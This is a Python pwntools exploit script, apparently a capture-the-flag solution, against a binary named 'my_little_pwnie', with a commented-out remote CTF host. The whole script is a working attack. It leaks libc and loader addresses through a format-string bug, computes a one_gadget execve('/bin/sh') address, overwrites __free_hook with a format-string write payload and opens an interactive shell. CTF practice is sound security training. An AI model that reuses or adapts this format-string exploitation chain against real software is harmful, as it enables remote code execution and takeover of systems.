from pwn import *
context.log_level="debug"
context.terminal=["terminator", "-e"]
elf_name = "./my_little_pwnie"
elf = ELF(elf_name)
elf.address = 0
context.binary=elf
#DEBUG

r = process("./launch1.sh", shell=True)

# REMOTE
# libc = ELF("./libc-2.27.so")
# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
libc = ELF("/glibc/x64/2.27/lib/libc-2.27.so")
# r = remote("pwnie.zajebistyc.tf", 17003)
# r = process(elf_name)
# payload1 = "%13$p,%15$p,%34$p,%94$s"

# gdb.attach(r)
# gdb.attach(r, '''
# b printf
# c
# ''')
raw_input("debug1")
payload1 = "%11$p%12$p"
r.sendline(payload1)
response1 = r.recvline()
ld_addr = response1[0:14]
print "_init=",ld_addr
# ld_addr = ld_addr[0:10] + 'd710'
lib_addr = response1[14:28]
print "ld_addr=",ld_addr
print "lib_addr=",lib_addr
# libc.address = int(lib_addr, base=16) - 0x3fc39f
libc.address = int(lib_addr, base=16) - 0x174007
ld_start = int(ld_addr, base=16) - 0x710 -0x1000
print "libc.address =", hex(libc.address)
print "ld_start =", hex(ld_start)
exit_hook = ld_start + 0x60 + 0xf00

#  one_gadget -f /glibc/x64/2.27/lib/libc-2.27.so
# 0x41612 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL
#
# 0x41666 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
#
# 0xdeed2 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

one_gaget = libc.address + 0x41612
free_hook = libc.symbols['__free_hook']
print "exit_hook:", hex(exit_hook)
print "one_gaget:", hex(one_gaget)

next_addr = libc.address + 0x3b0d80
idx_addr = next_addr + 8
payload2 = fmtstr_payload(6, {free_hook: one_gaget, next_addr:1, idx_addr: 1})
r.sendline(payload2)
r.recvrepeat(0.5)
# r.sendline("id")
r.interactive()